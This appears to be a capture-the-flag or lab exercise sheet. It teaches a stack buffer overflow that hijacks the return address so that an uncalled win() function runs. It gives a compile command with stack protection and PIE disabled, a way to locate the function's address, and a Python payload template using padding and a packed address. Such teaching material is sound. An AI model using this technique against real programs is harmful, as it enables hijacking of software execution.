Exercise 01 — Return-Oriented Hijacking
========================================

A program reads your input from stdin.
It copies it into a small stack buffer with no bounds check.
The function win() exists in the binary but is never called.

Your goal: make win() execute.

  Compile:
    gcc -fno-stack-protector -no-pie -o target target.c

  Find the address of win():
    nm target | grep win

  Send your payload via stdin:
    python3 -c "import sys, struct
    sys.stdout.buffer.write(b'A' * PADDING + struct.pack('<Q', ADDRESS))" | ./target

When you see [SUCCESS], run `horizon done`.
